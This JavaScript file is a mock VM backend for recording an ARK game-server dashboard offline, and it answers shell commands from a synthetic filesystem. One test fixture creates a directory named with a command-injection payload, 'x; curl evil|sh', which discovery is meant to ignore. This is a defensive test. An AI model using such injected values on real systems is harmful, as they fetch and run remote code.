// fake-vm.js — in-memory stand-in for the game VM, for recording the dashboard
// backend OFFLINE. It replaces backend/local.js (LocalExec) so nothing is ever
// executed: no sudo, no systemctl, no Proxmox, no RCON, no SSH. Every shell
// script the backend sends is pattern-matched and answered from a small virtual
// filesystem + service table. All data is synthetic.
'use strict';

const DIR = '/home/arkadmin/ark-manager';
const sh = (s) => `'${String(s).replace(/'/g, `'\\''`)}'`;

// Start time of an active service: always 90 minutes ago, so uptime strings do not drift with the date.
function startStamp() {
  const d = new Date(Math.floor(Date.now() / 1000) * 1000 - 5400e3);
  const p = (n) => String(n).padStart(2, '0');
  return `Thu ${d.getUTCFullYear()}-${p(d.getUTCMonth() + 1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())} UTC`;
}

function confText(o) { return Object.entries(o).map(([k, v]) => `${k}=${v}`).join('\n') + '\n'; }

function initialState() {
  const files = {};
  const services = {};
  const addMap = (display, internal, game, query, rcon, pw, state) => {
    const md = `${DIR}/maps/${display}`;
    files[`${md}/map.conf`] = confText({
      MapName: internal, DisplayName: display, SaveDir: display, GamePort: game, QueryPort: query,
      RCONPort: rcon, MaxPlayers: 70, AdminPassword: pw, ServerPassword: '', CustomStartParams: '-NoBattlEye -crossplay -NoHangDetection',
    });
    files[`${md}/GameUserSettings.ini`] = `[ServerSettings]\nSessionName=${display} test\nServerAdminPassword=${pw}\nServerPassword=\nRCONEnabled=True\nXPMultiplier=2.0\nHarvestAmountMultiplier=1.5\nTamingSpeedMultiplier=3.0\nServerPVE=True\nMaxTamedDinos=4000\nOverrideOfficialDifficulty=5.0\n`;
    files[`${md}/Game.ini`] = `[/script/shootergame.shootergamemode]\nBabyMatureSpeedMultiplier=4.0\nEggHatchSpeedMultiplier=2.0\n`;
    files[`${md}/backups/${display}_20260101_100000.tar.gz`] = '#backup 1.2G 2026-01-01 10:00:00';
    files[`${md}/backups/${display}_scheduled_20260102_030000.tar.gz`] = '#backup 1.1G 2026-01-02 03:00:00';
    services[`ark-${display.toLowerCase()}`] = { state, cpuQuota: 'infinity', memMax: 'infinity', memCur: state === 'active' ? '6442450944' : '[not set]' };
  };
  addMap('TheIsland', 'TheIsland_WP', 7777, 27015, 27020, 'dummy-admin-1', 'active');
  addMap('Ragnarok', 'Ragnarok_WP', 7779, 27016, 27021, 'dummy-admin-2', 'inactive');
  // a directory with a hostile name must be ignored by discovery
  files[`${DIR}/maps/x; curl evil|sh/map.conf`] = 'MapName=Evil\n';
  files[`${DIR}/config/server-defaults.conf`] = 'DefaultAdminPassword=dummy-default\n';
  files[`${DIR}/config/maps.conf`] = 'TheIsland|TheIsland_WP|enabled\nRagnarok|Ragnarok_WP|enabled\n';
  return {
    files, services,
    cron: [
      `0 4 * * * cd ${DIR} && ./ark-manager.sh restart TheIsland`,
      `*/30 * * * * cd ${DIR} && ./ark-manager.sh rcon TheIsland "SaveWorld"`,
      `0 3 * * * bash ${DIR}/dashboard-backup.sh ${DIR}/maps/TheIsland ${DIR}/server-files TheIsland scheduled`,
    ],
    players: { theisland: ['0. Alice, 0002abc', '1. Bob, 0003def'], ragnarok: [] },
  };
}

class FakeVm {
  constructor(cfg = {}) {
    this.allowHostPower = cfg.allowHostPower === true;
    this.s = initialState();
    this._hist = [];
  }

  async guestExec(args, opts = {}) {
    const [bin, flag, script] = args;
    const m = /^cat > (.+?)(?: && chmod \+x .+)?$/.exec(script || '');
    if (bin === '/bin/sh' && flag === '-c' && m) {
      const target = m[1].replace(/^'|'$/g, '').replace(/'\\''/g, "'");
      this.s.files[target] = opts.inputData == null ? '' : String(opts.inputData);
      return { exitcode: 0, out: '', err: '' };
    }
    return { exitcode: 127, out: '', err: 'fake-vm: unsupported exec' };
  }

  _svcOf(text) { const m = /ark-([a-z0-9_.-]+)/.exec(text); return m ? `ark-${m[1].replace(/\.service$/, '')}` : null; }

  async guestShell(script, opts = {}) {
    const s = this.s;
    const ok = (out, exitcode = 0, err = '') => ({ exitcode, out, err });
    let m;

    // discoverMaps
    if (script.includes('===MAP:')) {
      let out = '';
      const names = new Set();
      for (const p of Object.keys(s.files)) { const mm = /\/maps\/([^/]+)\/map\.conf$/.exec(p); if (mm) names.add(mm[1]); }
      for (const n of [...names].sort()) out += `===MAP:${n}===\n${s.files[`${DIR}/maps/${n}/map.conf`]}`;
      return ok(out);
    }
    // RCON password lookup
    if (script.startsWith('V=$(grep -E \'^AdminPassword=\'')) {
      m = /grep -E '\^AdminPassword=' '([^']+)'/.exec(script);
      const conf = s.files[m[1]] || '';
      const mm = /^AdminPassword=(.*)$/m.exec(conf);
      let v = mm ? mm[1] : '';
      if (!v) v = 'dummy-default';
      return ok(`PW<${v}>PW`);
    }
    // RCON client
    if (script.startsWith('python3 -c')) {
      const port = parseInt(script.trim().split(/\s+/).pop(), 10);
      const [pw, ...rest] = String(opts.inputData || '').split('\n');
      const cmd = rest.join('\n').trim();
      const svc = Object.keys(s.services).find((k) => {
        const disp = Object.keys(s.files).find((p) => p.endsWith('/map.conf') && new RegExp(`^RCONPort=${port}$`, 'm').test(s.files[p]));
        if (!disp) return false;
        return `ark-${/\/maps\/([^/]+)\/map\.conf$/.exec(disp)[1].toLowerCase()}` === k;
      });
      if (!svc || s.services[svc].state !== 'active') return ok('', 3, '__RCON_ERR__ [Errno 111] Connection refused');
      const disp = Object.keys(s.files).find((p) => new RegExp(`^RCONPort=${port}$`, 'm').test(s.files[p]) && p.endsWith('map.conf'));
      const real = (/^AdminPassword=(.*)$/m.exec(s.files[disp]) || [])[1];
      if (pw !== real) return ok('__RCON_AUTH_FAIL__\n', 2);
      if (/^ListPlayers/i.test(cmd)) {
        const pl = s.players[svc.replace(/^ark-/, '')] || [];
        return ok(pl.length ? pl.join('\n') + '\n' : 'No Players Connected\n');
      }
      if (/^SaveWorld/i.test(cmd)) return ok('World Saved\n');
      if (/^Broadcast/i.test(cmd)) return ok('Server received, But no response!!\n');
      return ok('Server received, But no response!!\n');
    }
    // service state
    if ((m = /^systemctl is-active (\S+) 2>\/dev\/null; echo "---"; systemctl show/.exec(script))) {
      const sv = s.services[m[1]];
      if (!sv) return ok('inactive\n---\nSubState=dead\nExecMainStartTimestamp=\n');
      const sub = sv.state === 'active' ? 'running' : 'dead';
      const ts = sv.state === 'active' ? startStamp() : '';
      return ok(`${sv.state}\n---\nSubState=${sub}\nExecMainStartTimestamp=${ts}\n`);
    }
    if ((m = /^systemctl show (\S+) -p CPUQuotaPerSecUSec/.exec(script))) {
      const sv = s.services[m[1]] || { cpuQuota: 'infinity', memMax: 'infinity', memCur: '[not set]' };
      return ok(`CPUQuotaPerSecUSec=${sv.cpuQuota}\nMemoryMax=${sv.memMax}\nMemoryCurrent=${sv.memCur}\n`);
    }
    if ((m = /^systemctl set-property (\S+) CPUQuota=(\d+)% MemoryHigh=(\S+) MemoryMax=(\d+)G/.exec(script))) {
      const sv = s.services[m[1]];
      if (sv) { sv.cpuQuota = `${+m[2] * 10}ms`; sv.memMax = String(+m[4] * 1073741824); }
      return ok('rc=0\n');
    }
    if ((m = /^systemctl (start|stop|restart) (\S+) 2>&1; echo "exit=\$\?"/.exec(script))) {
      const sv = s.services[m[2]];
      if (!sv) return ok(`Failed to ${m[1]} ${m[2]}.service: Unit ${m[2]}.service not found.\nexit=5\n`);
      sv.state = m[1] === 'stop' ? 'inactive' : 'active';
      sv.memCur = sv.state === 'active' ? '6442450944' : '[not set]';
      return ok('exit=0\n');
    }
    if (script.startsWith('df -B1 /')) return ok('/dev/vda1 107374182400 42949672960 64424509440 40% /\n');
    // paths()
    if (script.includes('echo "LOG=$L"')) {
      const g = (k) => (new RegExp(`echo "${k}=([^"]*)"`).exec(script) || [])[1] || '';
      return ok(`LOG=${DIR}/server-files/ShooterGame/Saved/Logs/ShooterGame.log\nGUS=${g('GUS')}\nGAME=${g('GAME')}\nBKP=${g('BKP')}\n`);
    }
    if ((m = /^tail -n (\d+) '([^']+)'/.exec(script))) {
      const lines = [
        '[2026.11.26-10:31:00:000][  0]Server has completed startup and is now advertising for join.',
        '[2026.11.26-10:40:01:000][  1]Player "Alice" joined the server',
        '[2026.11.26-10:41:02:000][  2]Player "Bob" joined the server',
        '[2026.11.26-11:00:00:000][  3]World Saving...',
        '[2026.11.26-11:05:00:000][  4]Started with ServerAdminPassword=hunter2 RCONPassword=abc123',
        '[2026.11.26-11:30:00:000][  5]Player "Bob" left the server',
      ];
      return ok(lines.slice(-parseInt(m[1], 10)).join('\n') + '\n');
    }
    if ((m = /^cat '([^']+)' 2>\/dev\/null$/.exec(script))) {
      return s.files[m[1]] != null ? ok(s.files[m[1]]) : ok('', 1);
    }
    if (script.startsWith('cat "$(ls ')) {
      const p = Object.keys(s.files).filter((k) => k.endsWith('/GameUserSettings.ini')).sort()[0];
      return ok(p ? s.files[p] : '');
    }
    if ((m = /^grep -E '\^CustomStartParams=' '([^']+)'/.exec(script))) {
      const mm = /^CustomStartParams=.*$/m.exec(s.files[m[1]] || '');
      return ok(mm ? mm[0] + '\n' : '');
    }
    // python3 heredocs (config edits)
    if (script.startsWith('python3 - ')) {
      const args = [...script.split('<<')[0].matchAll(/'((?:[^']|'\\'')*)'/g)].map((x) => x[1].replace(/'\\''/g, "'"));
      const path = args[0];
      let lines = s.files[path] != null ? s.files[path].split('\n') : [];
      if (script.includes('-ServerPlatform=')) {
        const arg = args[1]; let done = false;
        for (let i = 0; i < lines.length; i++) {
          if (lines[i].startsWith('CustomStartParams=')) {
            const toks = lines[i].split('=').slice(1).join('=').split(/\s+/).filter((t) => t && t !== '-crossplay' && !t.startsWith('-ServerPlatform='));
            toks.push('-ServerPlatform=' + arg);
            lines[i] = 'CustomStartParams=' + toks.join(' '); done = true; break;
          }
        }
        if (!done) lines.push('CustomStartParams=-ServerPlatform=' + arg);
      } else if (args.length >= 4) {
        const [, key, val, section] = args; let done = false;
        for (let i = 0; i < lines.length; i++) {
          if (new RegExp('^\\s*' + key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*=').test(lines[i])) { lines[i] = key + '=' + val; done = true; break; }
        }
        if (!done) {
          let idx = lines.findIndex((l) => l.trim().toLowerCase() === section.toLowerCase());
          if (idx < 0) { lines = [section, ...lines]; idx = 0; }
          lines.splice(idx + 1, 0, key + '=' + val);
        }
      } else {
        const [, key, val] = args; let done = false;
        for (let i = 0; i < lines.length; i++) {
          if (new RegExp('^\\s*' + key + '\\s*=').test(lines[i])) { lines[i] = key + '=' + val; done = true; break; }
        }
        if (!done) lines.push(key + '=' + val);
      }
      s.files[path] = lines.join('\n');
      return ok('OK\n');
    }
    // updates
    if (script.includes('appmanifest_2430930.acf')) return ok('16000000\n');
    if (script.includes('+app_info_print 2430930')) return ok('16000001\n');
    if (script.startsWith('nohup bash -c')) return ok('STARTED\n');
    // backups
    if (script.startsWith('ls -1t ')) {
      m = /^ls -1t '([^']+)'/.exec(script);
      const names = Object.keys(s.files).filter((p) => p.startsWith(m[1] + '/')).map((p) => p.slice(m[1].length + 1)).sort().reverse();
      return ok(names.map((n) => { const meta = /^#backup (\S+) (.+)$/.exec(s.files[`${m[1]}/${n}`]) || []; return `${n}|${meta[1] || '1M'}|${meta[2] || '2026-01-01 00:00:00'}`; }).join('\n') + (names.length ? '\n' : ''));
    }
    if (script.startsWith('runuser -u ') && script.includes('dashboard-backup.sh')) {
      m = /bash '[^']*dashboard-backup\.sh' '([^']+)' '[^']+' '([^']+)'/.exec(script);
      s.files[`${m[1]}/backups/${m[2]}_20261127_120000.tar.gz`] = '#backup 1.3G 2026-11-27 12:00:00';
      return ok('OK saved=SavedArks size=1.3G\n');
    }
    if ((m = /^rm -f '([^']+)' && echo DELETED/.exec(script))) { delete s.files[m[1]]; return ok('DELETED\n'); }
    // cron
    if (script.startsWith('crontab -l 2>/dev/null | grep -vE')) return ok(s.cron.join('\n') + (s.cron.length ? '\n' : ''));
    if (script.startsWith('( crontab -l 2>/dev/null; ')) {
      const echoes = [...script.matchAll(/echo '((?:[^']|'\\'')*)'/g)].map((x) => x[1].replace(/'\\''/g, "'"));
      echoes.forEach((l) => s.cron.push(l));
      const frag = (/grep -qF '((?:[^']|'\\'')*)'/.exec(script) || [])[1];
      return ok('ADDED\n' + (frag ? 'VERIFIED\n' : ''));
    }
    if ((m = /^crontab -l 2>\/dev\/null \| grep -vF '((?:[^']|'\\'')*)' \| crontab - && echo DELETED/.exec(script))) {
      const needle = m[1].replace(/'\\''/g, "'");
      s.cron = s.cron.filter((l) => !l.includes(needle));
      return ok('DELETED\n');
    }
    // createMap / deleteMap
    if ((m = /^\[ -d '([^']+)' \] && echo EXISTS \|\| echo OK/.exec(script))) {
      const exists = Object.keys(s.files).some((p) => p.startsWith(m[1] + '/'));
      return ok(exists ? 'EXISTS\n' : 'OK\n');
    }
    if (script.startsWith('mkdir -p ') || script.startsWith('chmod 600 ')) return ok('');
    if (script.startsWith('MC=') && script.includes('>> "$MC"')) return ok('');
    if (script.startsWith('systemctl daemon-reload; systemctl enable ')) {
      const svc = (/systemctl enable (\S+)\.service/.exec(script) || [])[1];
      if (svc) s.services[svc] = { state: 'inactive', cpuQuota: 'infinity', memMax: 'infinity', memCur: '[not set]' };
      return ok('SVCOK\n');
    }
    if (script.startsWith('systemctl stop ') && script.includes('echo DELETED')) {
      const svc = (/systemctl stop (\S+)\.service/.exec(script) || [])[1];
      const md = (/MCF='([^']+)\/map\.conf'/.exec(script) || [])[1];
      if (svc) delete s.services[svc];
      if (md) for (const p of Object.keys(s.files)) if (p.startsWith(md + '/')) delete s.files[p];
      return ok('DELETED\n');
    }
    return ok('', 127, `fake-vm: unsupported script: ${script.slice(0, 60)}`);
  }

  // ---- host metrics: constants, so every run is identical ----
  async vmStatus() {
    return { name: 'fake-vm', status: 'running', cpus: 4, cpu: 0.25, mem: 8e9, maxmem: 16e9, disk: 4e10, maxdisk: 1e11, uptime: 86400 * 3 };
  }
  async rrddata() { return [{ cpu: 0.25, mem: 8e9, maxmem: 16e9, netin: 1000, netout: 2000, time: 1 }]; }
  async vmPower(action) {
    if (!this.allowHostPower) {
      throw new Error(
        `Refusing to ${action} the machine: in local mode "the VM" is this server itself. ` +
        'Set ALLOW_HOST_POWER=1 in the dashboard env if you really want the panel to be able to do that.'
      );
    }
    return { exitcode: 0, out: '', err: '' };
  }
}

module.exports = { FakeVm, LocalExec: FakeVm, DIR, sh };
